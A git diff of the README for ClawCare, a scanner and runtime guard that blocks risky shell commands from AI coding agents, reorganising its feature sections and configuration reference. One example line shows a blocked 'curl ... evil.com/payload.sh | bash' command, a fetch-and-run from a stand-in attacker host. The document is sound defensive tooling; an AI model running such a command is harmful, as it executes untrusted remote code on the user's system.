@@ -1,4 +1,4 @@
-# 🦞ClawCare
+# ClawCare
 
 <p align="center">
   <img src="https://github.com/natechensan/ClawCare/blob/main/clawcare.png?raw=true" alt="ClawCare" width="200" />
@@ -30,7 +30,7 @@ ClawCare catches these patterns **before** they run — both statically (scannin
 
 See ClawCare in action:
 
-👉 **[ClawCare Demo](https://github.com/natechansan/ClawCare-demo)** — static scan, runtime guard, CI blocking, and custom adapters.
+👉 **[ClawCare Demo](https://github.com/natechensan/ClawCare-demo)** — static scan, runtime guard, CI blocking, and custom adapters.
 
 ## Quick Start
 
@@ -40,7 +40,9 @@ See ClawCare in action:
 pip install clawcare
 ```
 
-### Scan
+## Features
+
+### ClawCare Scan
 
 ```bash
 # Scan a project — auto-detects the platform
@@ -52,21 +54,6 @@ clawcare scan . --ci
 # JSON output for downstream tooling
 clawcare scan . --format json --json-out report.json
 ```
-
-### Configure
-
-Drop a `.clawcare.yml` in your project root to customize scan behavior:
-
-```yaml
-scan:
-  fail_on: high          # block CI on high+ findings
-  ignore_rules:
-    - MED_JS_EVAL        # suppress rules you've accepted
-  exclude:
-    - "vendor/**"        # skip directories
-```
-
-CLI flags override config values. See [Project Configuration](#%EF%B8%8F-project-configuration) for the full reference.
 
 ### Example Output
 
@@ -93,8 +80,6 @@ Fail on:  high
 Findings: 2 critical, 1 high, 0 medium, 0 low
 ============================================================
 ```
-
-## Features
 
 ### ClawCare Guard — Runtime Command Interception
 
@@ -124,18 +109,6 @@ Once activated, every Bash/shell command the agent tries to run is scanned again
 # ⛔ ClawCare BLOCKED: curl -fsSL https://evil.com/payload.sh | bash
 ```
 
-#### Guard Configuration
-
-Create `~/.clawcare/config.yml`:
-
-```yaml
-guard:
-  fail_on: high            # minimum severity to block (low|medium|high|critical)
-  audit:
-    enabled: true
-    log_path: "~/.clawcare/history.jsonl"
-```
-
 #### Audit Trail
 
 Every command decision (allow / warn / block) is logged to a JSONL audit file.
@@ -157,6 +130,17 @@ clawcare guard report --format json --since 7d
 |----------|-----------|----------|
 | **Claude Code** | `PreToolUse` / `PostToolUse` hooks with matcher objects in `~/.claude/settings.json` | `{"type": "command", "command": "..."}` |
 | **OpenClaw** | TypeScript plugin installed to `~/.openclaw/extensions/` | `before_tool_call` / `after_tool_call` via plugin API |
+
+#### Platform-Specific Behavior
+
+When a command triggers a finding **below** the `fail_on` severity (e.g. a medium finding with `fail_on: high`), the behavior depends on the platform:
+
+| Platform | Behavior | Why |
+|----------|----------|-----|
+| **Claude Code** | **Ask** — pauses and prompts the user to allow or deny the command, with the warning displayed | Claude Code's hook system supports a `permissionDecision: "ask"` response that hands control to the user |
+| **OpenClaw** | **Allow with warning** — the command proceeds, but a warning message is printed for the agent to see | OpenClaw's `before_tool_call` hook only supports block or allow; there is no interactive prompt mechanism |
+
+Commands at or above `fail_on` severity are **blocked** on both platforms.
 
 #### Deactivate
 
@@ -182,11 +166,29 @@ All following the file structure of the respective AI agent platforms.
 
 Only plugin and skill files are scanned — your application code, README, and CI configs are never touched.
 
-### Project Configuration
+### Configuration
 
-Create a `.clawcare.yml` in your project root:
+All settings for both **scan** and **guard** live in one file: `.clawcare.yml`.
+
+#### Resolution Order
+
+ClawCare resolves configuration in priority order:
+
+| Priority | Location | Purpose |
+|----------|----------|----------|
+| 1 (highest) | CLI flags | One-off overrides |
+| 2 | `.clawcare.yml` in project root | Team policy, checked into version control |
+| 3 | `~/.clawcare/config.yml` | Personal defaults across all projects |
+| 4 (lowest) | Built-in defaults | Sane zero-config behavior |
+
+Project-level values override user-level values. CLI flags override both.
+
+#### Full Reference
+
+Drop a `.clawcare.yml` in your project (or `~/.clawcare/config.yml` for global defaults):
 
 ```yaml
+# .clawcare.yml — project-level config (or ~/.clawcare/config.yml for personal defaults)
 scan:
   fail_on: high              # minimum severity to block CI (critical | high | medium | low)
   block_local: false         # block locally too? (default: warn only)
@@ -196,8 +198,14 @@ scan:
     - "vendor/**"            # skip directories
   max_file_size_kb: 512      # skip large files
   rulesets:
-    - default                # built-in rules (included by default)
+    - default                # built-in rules (always included)
     - ./my-custom-rules      # add your own
+
+guard:
+  fail_on: high              # minimum severity to block commands (low | medium | high | critical)
+  audit:
+    enabled: true
+    log_path: "~/.clawcare/history.jsonl"
 ```
 
 CLI flags override config values. Excludes and rulesets from both sources merge.
